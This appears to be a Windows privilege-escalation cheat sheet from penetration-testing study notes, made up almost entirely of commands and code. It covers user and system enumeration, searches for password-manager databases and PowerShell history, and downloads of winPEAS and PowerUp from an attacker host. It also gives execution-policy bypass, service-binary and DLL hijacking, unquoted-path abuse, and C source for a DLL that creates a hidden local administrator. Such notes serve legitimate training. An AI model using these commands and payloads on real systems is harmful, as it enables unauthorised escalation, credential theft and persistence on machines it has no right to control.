
## **Situational Awareness**

There are several key pieces of information we should always obtain:

```
- Username and hostname
- Group memberships of the current user
- Existing users and groups
- Operating system, version and architecture
- Network information
- Installed applications
- Running processes
```

> **Check the current user :** 

```
whoami
```

>**Check the groups of the current user :**

```
whoami /groups
```

>**Check the privileges of the current user :** 

```
whoami /priv
```

>**PowerShell - Check the current user :**

```
Get-LocalUser
```

>**PowerShell - Check the groups of the current user :**

```
Get-LocalGroup
```

>**PowerShell - Get the members of the *adminteam* group

```
Get-LocalGroupMember adminteam
```

>**Get Informations about the OS and patchs :** 

```
systeminfo
```

>**List all network interfaces :**

```
ipconfig /all
```

>**List all active network connections, 
>
>The argument *-a* to display all active TCP connections as well as TCP and UDP ports, *-n* to disable name resolution, and *-o* to show the process ID for each connection.**

```
netstat -ano
```

>**Check all installed applications (32 bits) :**

```
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname 
```

>**Check all installed applications (64 bits) :**

```
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

>**Get the running process in the system :**

```
Get-Process
```


## Hidden in Plain View

>**Search for all password manager databases on the system :**

```
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

>**Search for sensitive information in configuration files of XAMPP :**

```
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
```

>**Searching for texts or pdf files and others :**

```
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

>**Run a session as another user :**

```
runas /user:backupadmin cmd
```


## Information Goldmine PowerShell

>**Get the commands history of PowerShell :**

```
Get-History
```

>**Clear-History does not clear the command history recorded by PSReadline :**

```
(Get-PSReadlineOption).HistorySavePath
```

>**Display the PSReadlLine History :**

```
type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

## Automated Enumeration

>**Download winPEAS from attacker host :**

```
iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
```

## Service Binary Hijacking

>**Display the running services :**

```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

>**Check the permissions of the executable services :**

```
icacls "C:\xampp\apache\bin\httpd.exe"
```

>**Compile Windows C executable :**

```
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

>**Display the service who is named *mysql* :**

```
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
```

>**Displays services the current user can modify with PowerUp :**

```
iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1

powershell -ep bypass

Import-Module .\PowerUp.ps1

Get-ModifiableServiceFile
```

>**Check the user who is running the service :**

```
sc.exe qc EnterpriseService
```

## Service DLL Hijacking

>**The following listing shows the standard search order taken from the Microsoft Documentation :**

```
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.
```


>**We need to use an _include_ statement for the header file windows.h, since we use Windows specific data types such as _BOOL_. The final code is shown in the following listing :**

```
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave2 password123! /add");
  	    i = system ("net localgroup administrators dave2 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

>**Add *--shared* to specify that we want to build a DLL.**

```
kali@kali:~$ x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
```

## Unquoted service paths


>**Get Services vulnerable to Unquoted paths :**

```
Import-Module .\PowerUp.ps1

Get-UnquotedService
```

>**Abuse Unquoted Path Vulnerability :**

```
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
```

## Scheduled Tasks

>**Review all scheduled tasks. We enter */fo* with LIST as argument to specify the output format as list :**

```
schtasks /query /fo LIST /v
```


